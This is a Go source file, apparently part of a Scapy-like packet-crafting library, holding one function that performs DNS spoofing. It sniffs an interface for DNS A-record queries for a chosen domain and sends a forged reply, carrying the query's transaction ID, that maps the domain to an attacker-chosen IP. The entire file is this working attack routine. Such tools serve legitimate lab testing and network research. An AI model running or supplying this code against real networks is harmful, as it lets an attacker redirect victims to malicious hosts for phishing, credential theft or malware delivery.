package higherlevel

import (
	"fmt"
	"log"

	"github.com/google/gopacket/layers"

	craft "github.com/tiagomdiogo/GoPpy/packet"
	sockets "github.com/tiagomdiogo/GoPpy/supersocket"
)

// todo use Supersocket class
func DNSSpoofing(srcIP, dstIP, srcPort, dstPort, iface, queryDomain, answerIP string) error {
	// Open a live packet capture
	supersocket, err := sockets.NewSuperSocket(iface, "")
	if err != nil {
		return fmt.Errorf("Failed to initialize SuperSocket: %v", err)
	}
	defer supersocket.Close()

	for {
		// Receive a packet
		packet, err := supersocket.Recv()
		if err != nil {
			return fmt.Errorf("Failed to receive packet: %v", err)
		}

		dnsLayer := packet.Layer(layers.LayerTypeDNS)
		if dnsLayer == nil {
			continue
		}

		dns, _ := dnsLayer.(*layers.DNS)

		// Check if it's a DNS query for the domain we are spoofing
		for _, q := range dns.Questions {
			if string(q.Name) == queryDomain && q.Type == layers.DNSTypeA && q.Class == layers.DNSClassIN {
				log.Printf("Spoofing DNS response for domain %s\n", queryDomain)

				// Craft a spoofed DNS response
				dnsResponse, err := craft.CraftDNSResponsePacket(srcIP, dstIP, srcPort, dstPort, queryDomain, answerIP, dns.ID)
				if err != nil {
					return err
				}

				// Send the spoofed response
				err = supersocket.Send(dnsResponse)
				if err != nil {
					return fmt.Errorf("Failed to send packet: %v", err)
				}

				// One response is usually enough, but you can continue spoofing if you want
				return nil
			}
		}
	}
}
